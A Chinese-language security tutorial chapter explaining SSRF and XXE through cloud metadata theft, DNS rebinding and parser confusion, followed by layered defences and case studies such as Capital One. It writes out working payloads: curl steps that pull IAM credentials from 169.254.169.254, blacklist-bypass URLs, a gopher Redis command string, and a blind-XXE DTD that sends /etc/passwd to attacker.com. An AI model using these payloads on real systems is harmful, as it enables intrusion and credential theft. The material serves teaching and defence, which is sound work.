# SSRF 与 XXE:内网穿透 / 云元数据 / DTD 外部实体

讲 SSRF 最容易的误区是「我后端只是 fetch 一个 URL,跟安全有什么关系」——**这种"我只是发个 HTTP 请求"的想法,是 2019 年 Capital One 1 亿条用户数据被打的根因**。SSRF 不像 XSS 直接让用户 JS 执行,也不像 SQL 注入直接落库——**它做的事就一件:让服务器替攻击者去发请求**。你的服务器在内网,攻击者在外网;你能访问的 `redis://10.0.0.5:6379` / `http://169.254.169.254/iam/`,**攻击者借你的腿一脚就踹进来**。XXE 是 SSRF 的远房亲戚,通过 XML 解析器的 DTD 特性实现同类效果——**两个漏洞合在一起讲,因为它们的本质完全一样:让"内部组件帮外部攻击者发请求"**。

> 一句话先记住:**SSRF = 攻击者借服务器之手访问服务器能访问、但攻击者本来访问不到的东西**。**XXE = 借 XML 解析器之手做同样的事**。两者的核心防御都是**白名单 + DNS 解析后再校验 IP + 禁用元数据接口**——而不是"过滤 URL"。任何"我把 `127.0.0.1` 和 `169.254` 黑名单掉"的方案在 DNS rebinding 面前都是裸的;任何"我用 `urllib` 内置功能就够了"的方案在 URL 解析器差异面前都会被打穿。

---

## 一、SSRF 为什么存在,它的"前世今生"

### 1.1 根本原因:网络位置的不对称

互联网上**信任模型的核心假设**是「内外网有边界」——外网用户进不来内网,内网服务互相信任。这套模型在云时代依然广泛存在:

```
Internet  ──┐
            │
            ▼
       [WAF / LB]
            │
            ▼
    ┌───────────────────────┐
    │   应用服务器(你的代码)│  ← 攻击者能打到这里
    │                       │
    │   Redis / MySQL       │  ← 攻击者本来打不到
    │   内部 admin API      │
    │   云元数据 169.254... │
    │   Kubernetes API      │
    └───────────────────────┘
```

应用服务器**自己就在内网里**——它访问 Redis、MySQL、Kafka、Consul、内部 admin、云元数据都不用过认证(因为"内网默认可信")。而互联网上的攻击者**只能看到那道 WAF 后面的应用层 HTTP**。

**SSRF 做的事就是把这个不对称打破**:你的应用代码里有任何一个「拿用户给的 URL 去 fetch」的功能——头像、缩略图、URL 预览、Webhook、PDF 渲染、第三方授权回调——**那个功能就是攻击者塞进内网的一根管子**。

### 1.2 为什么这么常见:HTTP 客户端是"开放性"工具

SQL 注入的修复方式很明确——prepared statement,几乎一劳永逸。**SSRF 没有这种银弹**,因为「服务器主动发请求」就是业务需求本身,你不能禁止它发请求,只能限制它**往哪发**。

而限制目标是**结构性困难**:

- URL 解析复杂(协议 / 用户名 / 域名 / 端口 / 路径)
- 域名解析在运行时才发生(DNS 是动态的)
- 协议种类繁多(`http` / `https` / `gopher` / `file` / `ftp` / `dict` / `redis` ...)
- 应用层语义嵌套(HTTP 里能塞 HTTP 重定向、HTTP 里能塞 SMTP)

**任何单点过滤都有漏**——这是后面要讲的所有绕过姿势的根源。

### 1.3 第二层根源:云原生时代的元数据接口

云厂商提供了一个**没有认证的 HTTP 接口**让 EC2 实例查询自身信息——AWS 是 `http://169.254.169.254/latest/meta-data/`,GCP 是 `http://metadata.google.internal`,阿里云 / Azure / 腾讯云全有自己的元数据 endpoint。

**这个接口的"信任假设"是**:只有 EC2 实例自己才能访问这个地址(`169.254.169.254` 是 link-local 地址,理论上路由不出去)。**但 SSRF 直接打穿了这个假设**——攻击者不需要登上你的 EC2,只要 SSRF 一次,让你的应用代替它访问 `169.254.169.254`,就能拿到:

- IAM 角色名
- 临时 AccessKey / SecretKey / Token
- 用户数据(user-data,经常塞着 init 脚本)

**拿到 IAM 临时凭证 = 拿到这个 EC2 在云上能干的所有事**。Capital One 2019 年就是这么丢了 1 亿条信用卡申请数据——后面专门讲。

---

## 二、攻击者怎么用一个"头像上传"打穿内网

### 2.1 经典 SSRF 入口

最常见的 SSRF 入口:**头像上传**(用户填 URL,服务器拉下来存 CDN)、**URL 预览**(Slack / 飞书发链接自动展开预览,抓 og:image / title)、**缩略图 / PDF 转图片**(后端 Headless Chrome 渲染)、**Webhook 出站**(服务器在事件发生时 POST 到用户配置的 URL)、**SSO / OAuth 回调**(用户控制 redirect_uri)、**RSS / iCal 订阅**、**文档导入**。**共同点**:用户提供 URL,服务器去访问。**没做好限制,每一个都是 SSRF**。

利用链 step by step:

```
1. 攻击者填头像 URL = http://169.254.169.254/latest/meta-data/iam/security-credentials/
2. 服务器(部署在 AWS EC2)拿这个 URL 去 fetch
3. AWS 元数据服务返回 IAM 角色名字
4. 攻击者再填 .../iam/security-credentials/{role-name}
5. 服务器 fetch 后返回 JSON,里面有 AccessKey / SecretKey / Token
6. 这些临时凭证可能有 S3 读写 / RDS 访问 / Lambda 调用权限
7. 攻击者拿凭证直接调 AWS API,绕过应用层所有认证
```

**第 1-2 步是 SSRF,第 7 步是真正的破坏**——SSRF 本身是"载荷传递机制",**真正的破坏发生在它打到的目标上**。

### 2.2 内网横向:不止打元数据

云元数据是最具代表性的 SSRF 目标,但远不是唯一的。任何**没有认证、只靠"网络隔离"防护的内部服务**都是 SSRF 的肉。常见的内部 endpoint:

| 服务 | 默认端口 | 危害 |
| --- | --- | --- |
| Redis | 6379 | 写 key 触发 RCE(配合主从复制 / module load) |
| Memcached | 11211 | 读 cache 内的 session token / 数据缓存 |
| Elasticsearch | 9200 | 读所有索引、改 mapping、scripting 触发 RCE |
| Kubernetes API | 6443 / 10250 | 创建 Pod 直接拿 cluster 控制权 |
| Docker daemon | 2375 (无 TLS) | `POST /containers/create` 直接拿宿主机 root |
| Consul / etcd | 8500 / 2379 | 改服务发现 → 中间人 |
| Spring Actuator | /actuator/* | Heapdump 拿 secret,jolokia 触发 RCE |
| AWS / GCP / 阿里云元数据 | 169.254.169.254 | 偷 IAM 临时凭证 |

**SSRF 本质上是把"内网随便逛"的能力卖给了外部攻击者**——比起单点拿凭证,更可怕的是"先用 SSRF 探测内网拓扑,再针对性打"。

### 2.3 协议跨越:gopher / file / dict 让 SSRF 变 RCE

如果服务端 HTTP 客户端**不限制协议**,SSRF 就能升级。最经典的是 `gopher://` —— Gopher 是 1991 年的老协议,**它的"请求格式"几乎能模拟任何明文 TCP 协议**:

```
gopher://10.0.0.5:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a...
```

**URL 解码后就是一段完整的 Redis 命令序列**——`libcurl` 的 gopher handler 把它原样发到 6379,Redis 收到看不出区别。**SSRF + gopher = 远程操控 Redis**,然后用 `CONFIG SET dir / dbfilename / SAVE` 把数据库 dump 成 SSH `authorized_keys`,实现 RCE。其他危险协议:`file://` 读本地文件、`dict://` 探测内部端口、`ftp://` 触发 PASV 攻击、Java 的 `jar://` / `netdoc://`。**Java 的 `URL` 类默认支持十几种协议,Python `urllib` 也支持 `ftp` / `file`——不显式协议白名单 = 给攻击者高速通道**。

---

## 三、最小 PoC:从一行 SSRF 到云元数据

### 3.1 漏洞代码(Python Flask)

```python
@app.route('/fetch_avatar', methods=['POST'])
def fetch_avatar():
    url = request.json['avatar_url']
    # 漏洞:没校验 url 就发请求
    r = requests.get(url, timeout=5)
    save_to_cdn(r.content)
    return {'status': 'ok'}
```

**这五行代码在 AWS EC2 上部署就是高危**。

### 3.2 攻击 payload(三步打穿)

```bash
# Step 1: 拿 IAM 角色名
curl -X POST https://victim.com/fetch_avatar \
  -d '{"avatar_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# 返回:s3-readwrite-role

# Step 2: 拿临时凭证
curl -X POST https://victim.com/fetch_avatar \
  -d '{"avatar_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/s3-readwrite-role"}'
# 返回:{"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}

# Step 3: 拿凭证直接调 AWS API
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws s3 ls   # 列出所有 bucket,然后想拷哪个拷哪个
```

**这就是 Capital One 2019 事件的简化模型**——一个配置错的 WAF 加一个允许出站访问元数据的 EC2,1 亿条用户记录就这么被拖走了。

### 3.3 "我加了黑名单"——为什么不够

```python
BLOCKED = ['127.0.0.1', 'localhost', '169.254.169.254', '10.', '172.', '192.168.']

def fetch_avatar():
    url = request.json['avatar_url']
    parsed = urlparse(url)
    if any(b in parsed.hostname for b in BLOCKED):
        return 'forbidden', 403
    r = requests.get(url, timeout=5)
    ...
```

**看起来防住了**。下面六种 payload 全部能绕过这个黑名单(每一种都对应一个真实漏洞类别):

```
1. 进制变体:   http://2130706433/   (= 127.0.0.1 的十进制 IP)
2. 短格式:     http://127.1/        (= 127.0.0.1,IP 缩写)
3. 八进制:     http://0177.0.0.1/   (= 127.0.0.1)
4. IPv6 映射:  http://[::ffff:7f00:1]/  (IPv6 包 IPv4)
5. DNS 解析:   http://attacker.com/  → A 记录指向 127.0.0.1
6. 重定向:     http://attacker.com/redirect → 302 到 169.254.169.254
```

**所有黑名单的根本问题**:你过滤的是"字符串",但目标是"网络访问"。攻击者只需要找到任何一种让最终连接的 IP 落到内网、而字符串又不被你的黑名单匹配的方法。**这就是为什么白名单 + DNS 解析后再校验 IP 才是正确思路**——后面会讲。

---

## 四、绕过姿势:DNS rebinding 与 URL 解析器差异

### 4.1 DNS rebinding:让"白名单域名"也变成内网

假设你做了升级:不仅校验字符串,还在 `requests.get` 之前 `socket.gethostbyname` 解析一次,**确认 IP 不在内网**才放行。

```python
def fetch_avatar():
    url = request.json['avatar_url']
    host = urlparse(url).hostname
    ip = socket.gethostbyname(host)
    if is_internal(ip):
        return 'forbidden', 403
    r = requests.get(url, timeout=5)  # ← 又解析了一次!
```

**这段代码看起来更严格**,但仍然能被 **DNS rebinding** 绕过。攻击者控制 `attacker.com` 的 DNS 服务器,**TTL 设成 0**,前后两次 DNS 查询返回不同 IP:

```
你的代码第一次 gethostbyname("attacker.com")   → 1.2.3.4    (公网 IP,通过校验)
requests.get 内部第二次 DNS 查询             → 169.254.169.254 (内网 IP!)
```

**TOCTOU(Time of Check to Time of Use)经典案例**——校验和使用之间用的是两个 IP。**修复办法**:解析一次 IP 后,**用 IP 直连**(配合 SNI/Host header),保证"校验的 IP = 实际连接的 IP"。

### 4.2 URL 解析器差异:parser confusion

Orange Tsai 在 Black Hat 2017 的「A New Era of SSRF」演讲是这个领域的奠基议题——**同一个 URL,不同语言的解析器解析出来的 host 完全不同**。

```
URL: http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

Python urllib   → host = 3.3.3.3
Java URL        → host = 2.2.2.2
PHP parse_url   → host = 1.1.1.1 (host part) 但 curl 走 2.2.2.2
Ruby URI        → 抛异常
Go net/url      → host = 2.2.2.2
libcurl         → 实际连接 1.1.1.1
```

**攻击模型**:用一种解析器(应用层校验用的)把 URL 看成"合法外网域名",用另一种解析器(实际发请求用的)把 URL 看成"内网地址"。这种"应用层校验和底层连接器之间的语义差"几乎在每个语言都存在。

```python
# 看似合理的校验:
parsed = urlparse(url)
if is_internal_ip(socket.gethostbyname(parsed.hostname)):
    raise Forbidden()
# 但 requests / curl 用了不同的 URL 解析器
requests.get(url)  # ← 解析出来的 host 可能是另一个!
```

**根本解法**:校验完后**自己构造请求**——把 IP / 端口 / 协议都拿在手里,不要把原始 URL 再交给底层库重新解析。

### 4.3 重定向链 + IPv4/v6 双栈混淆

```python
r = requests.get(safe_url, allow_redirects=True)
```

`safe_url` 是 `attacker.com/redirect`,返回 `302 Location: http://169.254.169.254/...` —— requests 自动跟随,**第二跳目标根本没经过你的校验**。**修复**:`allow_redirects=False`,自己处理重定向,**每一跳都校验**。

另一个常被遗漏的:`http://[::ffff:7f00:1]/` 是 IPv4 映射的 IPv6 地址,**实际访问的还是 127.0.0.1**。很多 IP 校验函数只考虑 IPv4 形式,IPv6 的内网检测(`fc00::/7`、`fe80::/10`、`::1`)经常漏掉。

---

## 五、XXE:XML 解析器送你的 SSRF

### 5.1 DTD 外部实体是什么

XML 标准里有个"实体"(entity)机制——可以**在文档头定义一些"宏"**,文档体里 `&name;` 引用就会被替换。**实体可以从外部 URL 加载**——这就是 XXE 的命门。

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

XML 解析器看到 `&xxe;` 会去**读 `/etc/passwd`** 的内容然后替换进去——**解析出来的 XML 文档里就包含目标文件的内容**。如果应用把解析后的 XML 回显出来(典型场景:SAML 登录、SOAP 接口、Office 文档解析、SVG 上传),`/etc/passwd` 内容就泄露了。

`SYSTEM` 后面也可以填 `http://internal-service/`——**这就是 XXE 实现 SSRF 的姿势**,本质和上面讲的 SSRF 完全同源。

### 5.2 最小 PoC

```python
# 漏洞代码:用 lxml 或 xml.etree 解析用户 XML
from lxml import etree
def parse(xml_str):
    return etree.fromstring(xml_str)  # 默认未禁 DTD,libxml2 老版本默认 resolve external
```

```xml
<!-- 攻击 payload -->
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<r>&x;</r>
```

如果服务端把解析后的 XML 拿来生成响应(比如订单详情、SOAP fault 回显),**IAM 信息就直接打到攻击者的页面里了**。

### 5.3 Blind XXE:服务端不回显怎么办

很多时候服务端只把 XML 当配置吃下去,**不回显任何内容**——但 XXE 依然可以"外带"(out-of-band)数据。攻击者用一个**带参数的实体定义**,让 XML 解析器**把文件内容当 URL 一部分**发到攻击者控制的服务器:

```xml
<!-- 主文档 -->
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<r/>
```

```xml
<!-- attacker.com/evil.dtd 的内容 -->
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%file;'>">
%all;
%send;
```

**工作原理**:解析器读文件内容到 `%file;`,然后把它拼到 URL 里发请求 → 攻击者的 Web 服务器日志收到 `/?d=root:x:0:0:...`。**整个过程服务端没回显任何东西,但数据已经被外带走了**。

这就是为什么 XXE 即使在"看不到响应"的接口里(SAML / 票据校验 / 健康检查)也是高危——**数据通道根本不依赖应用层 HTTP 响应**。

### 5.4 XXE 历史教科书:Facebook OpenID(2014)

研究员 Reginaldo Silva 在 Facebook 的 OpenID 登录流程发现 XXE——服务器解析 OpenID assertion 时没禁 DTD。通过 `file:///etc/passwd` 外带,**他能读 Facebook 生产服务器上的任意文件**,顺手拿到了 ssh key。Facebook 赏 $33,500——当年 bug bounty 史上最高。

> XXE 现状:**主流 XML 库现在大多默认禁 DTD**——但**遗留系统和某些 SOAP / SAML / Office 文档处理库依然默认开**。审计时一抓一个准。

---

## 六、防御:从单点到纵深

### 6.1 第一层:协议白名单 + 域名白名单

```python
ALLOWED_SCHEMES = {'http', 'https'}
ALLOWED_DOMAINS = {'cdn.partner.com', 'images.trusted.com'}

def is_url_safe(url):
    p = urlparse(url)
    if p.scheme not in ALLOWED_SCHEMES: return False
    if p.hostname not in ALLOWED_DOMAINS: return False
    return True
```

**白名单是 SSRF 防御的银弹**。如果业务允许,**永远首选白名单**——「只允许这 3 个合作方 CDN 的域名」比「禁掉一百种内网形式」工程上稳得多。**90% 的 SSRF 场景其实都能用白名单解决**(头像 = 限制几个 CDN,Webhook = 用户在控制台预登记 URL)。

### 6.2 第二层:解析后再校验 IP(handle DNS rebinding)

如果业务必须"接受用户任意外网 URL"(比如 RSS 订阅这种场景),那白名单不适用——这时候必须做**正确的 IP 校验**:

```python
import ipaddress, socket

PRIVATE_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),  # link-local 包含云元数据
    ipaddress.ip_network('::1/128'),
    ipaddress.ip_network('fc00::/7'),
    ipaddress.ip_network('fe80::/10'),
]

def fetch_safely(url):
    p = urlparse(url)
    if p.scheme not in {'http', 'https'}: raise BadUrl()
    # 一次性解析所有 A / AAAA 记录
    infos = socket.getaddrinfo(p.hostname, p.port or 80)
    ips = [ipaddress.ip_address(i[4][0]) for i in infos]
    for ip in ips:
        if any(ip in n for n in PRIVATE_RANGES):
            raise BadUrl(f'{ip} is internal')
    # 关键:用 IP 直连,带 Host 头,绕过 DNS rebinding
    chosen = str(ips[0])
    return requests.get(
        url.replace(p.hostname, chosen),
        headers={'Host': p.hostname},
        allow_redirects=False,   # 自己处理重定向,每一跳都校验
    )
```

**两个关键动作**:

1. **校验所有 A / AAAA 记录**——攻击者可能在 DNS 里同时返回外网和内网 IP,只要有一个是内网就拒绝。
2. **用解析出来的 IP 直连**——保证"校验的 IP = 实际连接的 IP",彻底封死 DNS rebinding。

### 6.3 第三层:云元数据接口加固(IMDSv2)

AWS 在 Capital One 事件后推出 **IMDSv2**——把元数据接口从"GET 直接拿"改成"先 PUT 拿 session token,再带 token 取数据"。

```
IMDSv1(旧,默认允许):
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role
  → SSRF 可以打,因为只要 GET 就行

IMDSv2(新,推荐强制):
  Step 1: PUT http://169.254.169.254/latest/api/token
          + Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
          → 返回 token
  Step 2: GET .../iam/security-credentials/role
          + Header: X-aws-ec2-metadata-token: <token>
```

**为什么 IMDSv2 能防 SSRF**:大多数 SSRF 利用的 HTTP 客户端**只能发 GET / POST,不能发 PUT,而且不能塞自定义 Header**——尤其是头像 / URL 预览这种场景,客户端是固定的 GET。**所以 IMDSv2 直接卡掉了 90% 的 SSRF 元数据攻击**。额外两道闸:**强制要求 `X-Forwarded-For` 不存在**(防反向代理穿透)、**响应 hop-limit = 1**(防容器里 SSRF 打宿主机元数据)。**所有 AWS 实例都应该强制 `HttpTokens=required`**——SDL 里必须写进的硬性要求。

### 6.4 第四层:XXE 一行修复

XML 解析器禁 DTD,几乎一行代码:

```python
# Python:
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
etree.fromstring(xml, parser)

# 或者 defusedxml(推荐,自动禁所有 unsafe feature)
from defusedxml import ElementTree
ElementTree.fromstring(xml)
```

```java
// Java:
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

**记一个铁律**:**所有解析"非可信"XML 的入口,都必须禁 DTD**。Office 文档(`.docx` / `.xlsx` 内部是 XML)、SAML、SOAP、SVG、RSS、OPML——全部都是 XXE 高危入口。

### 6.5 第五层:网络层兜底

应用层即便有漏洞,网络层还能再加一道:**出站 ACL**(应用服务器默认不允许出站访问任何内网 IP)、**应用专用出站代理**(所有出站 HTTP 必须经过 proxy,内置白名单 + IP 校验)、**元数据接口隔离**(Security Group 显式拒绝出站到 169.254.169.254)、**Service Mesh / Sidecar**(Istio / Linkerd egress 策略强制白名单)。

### 6.6 防御层次速查

| 层 | 机制 | 解决什么 |
| --- | --- | --- |
| 1 | URL 白名单(协议 + 域名) | 90% 业务场景的 SSRF |
| 2 | DNS 解析后校验 IP + 用 IP 直连 | rebinding / parser confusion |
| 3 | IMDSv2 强制 + hop-limit=1 | 云元数据被 SSRF 偷凭证 |
| 4 | XML 解析器禁 DTD + 用 defusedxml | XXE 全家桶 |
| 5 | 出站 ACL / egress proxy / 元数据接口隔离 | 应用层漏过也兜得住 |

---

## 七、真实案例:三个被打穿的故事

### 7.1 Capital One(2019,1 亿条数据)

**攻击链**:

1. Capital One 用 AWS,WAF(ModSecurity)配置错误,**允许 WAF 自己被 SSRF**——攻击者构造特定请求,WAF 替攻击者发出去。
2. WAF 实例自带一个 IAM 角色 `WAF-Role-*`,有 S3 读权限。
3. 攻击者通过 SSRF 让 WAF 访问 `169.254.169.254/iam/security-credentials/WAF-Role-*`,拿到临时凭证。
4. 用凭证 `aws s3 sync` 拖走了 Capital One 在 S3 上的信用卡申请数据库——**1.06 亿条记录**。

**这次事件的结构性教训**:

- IMDSv1 默认允许 GET → AWS 紧急推 IMDSv2
- WAF 自身的 IAM 角色权限过大(违反最小权限)
- SSRF 校验在 WAF 自己身上根本没做
- 没有出站 ACL,WAF 能随便访问元数据接口

**罚款**:美国 OCC 罚 8000 万美金,Capital One 自己赔了几亿美金的集体诉讼。**这是 IMDSv2 真正推行的导火索**。

### 7.2 GitHub Webhook SSRF(2017)

GitHub 的 Webhook 让用户配置 callback URL,每次 push/PR/issue 都会 POST 过去——**早期版本可以指向 `127.0.0.1` 和内网**。研究员通过 Webhook 探测 GitHub 内网拓扑 + 攻击内网组件。GitHub 修复方式:Webhook 解析时强制 DNS 解析 + 校验 IP 不在内网范围,加上一个内置出站 proxy,**所有 webhook 流量必经其过滤**。

### 7.3 阿里云元数据被打(2019)

国内多家用阿里云的 SaaS 在 2019 年因 SSRF 丢过元数据。阿里云元数据接口是 `http://100.100.100.200/latest/meta-data/`——和 AWS 设计同源,**早期同样默认 GET 拿凭证**,当时还没有 IMDSv2 对应的强化机制。多家厂商被 SSRF 拖走 RAM AccessKey,然后被横向打 OSS / RDS。阿里云后来推出 **元数据 v2(token 模式)**,模型对齐 AWS IMDSv2。

> 三个案例的共同点:**SSRF 本身只是"开门",真正的破坏来自"门后是什么"**。零信任的真正含义在这里——**内网不应该有"默认信任"的接口**,元数据 / Redis / K8s API 都应该有自己的认证,SSRF 才不会瞬间放大。

---

## 八、踩坑提醒

1. **以为 SSRF 只是"读个内网"**——元数据接口给的是 IAM 临时凭证,**SSRF 一发 = 云账号被部分接管**。
2. **以为 `if '127.0.0.1' in url` 这种黑名单够用**——进制 / 短格式 / IPv6 映射 / DNS 重绑定六种姿势直接绕。
3. **以为校验 hostname 字符串就行**——校验和实际连接之间隔着 DNS,**TOCTOU 必中招**。
4. **以为 `allow_redirects=True` 没问题**——302 到 169.254 你校验失效;**所有重定向必须每跳重新校验**。
5. **以为禁了 `http://` 就行**——`gopher://` / `dict://` / `file://` 都能干坏事,**协议必须白名单**。
6. **以为 IMDSv1 已经下线**——AWS 直到现在还允许 IMDSv1,旧实例不会自动迁移,**必须主动检查 `HttpTokens=required`**。
7. **以为 XML 解析器都默认禁 DTD**——`libxml2` 老版本、Java `DocumentBuilderFactory` 默认值历史上反复横跳,**审计时一律手动设置禁 DTD**。
8. **以为内部接口"没人能访问"**——SSRF 让外部攻击者借应用之手访问,**内部接口必须有自己的认证**。
9. **以为 PDF 渲染 / Headless Chrome 不算 SSRF 入口**——`<iframe src=file:///etc/passwd>` 嵌进 PDF 模板照样能读文件。
10. **以为 Webhook 是低危功能**——Webhook = 用户控制出站 URL,**和头像功能完全同构**;Slack / GitHub / 钉钉都为这个写过专门的 egress proxy。

---

## 九、本篇核心

**SSRF / XXE 的本质就一句**:**让"具有内部访问权限的进程"替"无内部访问权限的攻击者"发请求**。所有防御都围绕这一句:

```
1. 限制出口 URL(白名单 + 协议白名单)
2. 解析后校验 IP(不只看字符串)
3. 用 IP 直连(防 rebinding)
4. 元数据接口加固(IMDSv2 强制)
5. XML 解析器禁 DTD
6. 出站 ACL / egress proxy 兜底
```

**写代码时的本能反应应该是**:看到任何 `requests.get(user_input)` / `URL.openStream(user_input)` / `<img src={user_input}>` / `XMLParser` 接受外部输入——**停下来想 30 秒**,这个 URL / XML 从哪来、限制了哪些协议、解析后真正连到哪个 IP、有没有跟着 redirect、是不是部署在云上有元数据风险。**这 30 秒的习惯,在云原生时代每天阻挡掉一次 Capital One**。

最后一句话总结这一篇:**「内网默认信任」是云时代最危险的设计假设**——不管这个"内网信任"是 IAM 元数据接口、Redis 无认证、Kubernetes API、Spring Actuator,还是某个老 SOAP 服务,SSRF 都会把这个假设撕开给攻击者看。**零信任不是营销词,是每个内部接口都必须自己长出认证机制**。

---

下一篇:`14-反序列化漏洞.md`,讲清楚 Java / Python / Node / PHP 四个生态的反序列化漏洞图景——为什么 `ObjectInputStream.readObject` 是 Java 服务端最危险的 API、`pickle.loads` 在 Python 工程里几乎等价于 `eval`、PHP `unserialize` 的 `__wakeup` / `__destruct` 魔术方法链怎么拼,以及 Node.js 因为没有"语言级反序列化"反而坑更隐蔽(JSON 反序列化 + prototype pollution = 等价 RCE)。看完你能在代码评审里第一眼挑出反序列化点。
